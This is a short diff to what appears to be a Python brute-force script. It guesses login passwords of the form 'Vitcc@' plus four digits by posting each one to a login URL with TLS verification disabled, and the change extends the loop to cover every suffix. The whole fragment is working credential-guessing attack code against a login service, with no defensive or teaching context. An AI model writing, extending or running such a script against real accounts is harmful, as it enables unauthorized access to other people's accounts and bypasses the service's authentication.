@@ -14,7 +14,7 @@ if not re.match(r"\d{2}\w{3}\d{4}", username):
     time.sleep(5)
     sys.exit(0)
 
-for suffix in range(6931, 9999):
+for suffix in range(9999):
     password = "Vitcc@" + f"{suffix:04}"
     suc = {'username': username, 'password': password}
     check = s.post(url, data = suc, verify = False)
